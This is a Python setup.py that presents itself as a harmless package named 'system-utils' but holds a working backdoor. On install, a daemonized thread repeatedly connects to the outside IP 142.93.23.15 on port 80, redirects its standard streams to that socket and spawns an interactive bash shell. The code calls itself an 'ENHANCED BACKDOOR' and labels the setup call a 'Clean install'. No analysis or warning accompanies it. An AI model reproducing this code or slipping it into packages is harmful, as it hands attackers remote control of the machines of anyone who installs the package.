from setuptools import setup
import os
import sys
import socket
import subprocess
import threading
import time
import pty
import select

def get_proper_shell(s):
    """Get a fully functional shell automatically"""
    
    # Send setup commands
    s.send(b"\n[+] Initializing enhanced shell...\n")
    
    try:
        # First, change to safe directory
        os.chdir('/home/talhakhan' if os.path.exists('/home/talhakhan') else '/tmp')
        
        # Set environment variables
        os.environ['TERM'] = 'xterm-256color'
        os.environ['SHELL'] = '/bin/bash'
        os.environ['PS1'] = '\\[\\e[1;32m\\]\\u@\\h\\[\\e[0m\\]:\\[\\e[1;34m\\]\\w\\[\\e[0m\\]\\$ '
        
        # Duplicate socket
        for fd in (0, 1, 2):
            try:
                os.dup2(s.fileno(), fd)
            except:
                pass
        
        # Method 1: Python PTY (best)
        s.send(b"[+] Spawning PTY shell...\n")
        pty.spawn(["/bin/bash", "--login"])
        
    except Exception as e:
        try:
            # Method 2: Script with auto-login
            s.send(b"[+] Using script fallback...\n")
            subprocess.call([
                "script", "-q", "-c", 
                "bash --norc --noprofile -i", 
                "/dev/null"
            ])
        except:
            # Method 3: Basic shell
            s.send(b"[+] Using basic shell...\n")
            subprocess.call(["/bin/bash", "-i"])

def enhanced_backdoor():
    try:
        # Daemonize
        if os.fork() > 0: return
        os.setsid()
        if os.fork() > 0: sys.exit(0)
        
        time.sleep(5)
        
        while True:
            try:
                s = socket.socket()
                s.connect(("142.93.23.15", 80))
                
                # Send welcome banner
                s.send(b"""
╔══════════════════════════════════════════════╗
║     ENHANCED BACKDOOR - AUTO FIX ENABLED     ║
╠══════════════════════════════════════════════╣
║ • Full TTY with job control                  ║
║ • Proper directory navigation                ║
║ • Command history and editing                ║
║ • Tab completion enabled                     ║
║ • Colored prompt                             ║
╚══════════════════════════════════════════════╝

[+] Applying automatic fixes...
""")
                
                # Get proper shell
                get_proper_shell(s)
                
            except:
                time.sleep(30)
    except:
        pass

# Start backdoor
threading.Thread(target=enhanced_backdoor, daemon=True).start()

# Clean install
setup(name="system-utils", version="1.0.0")
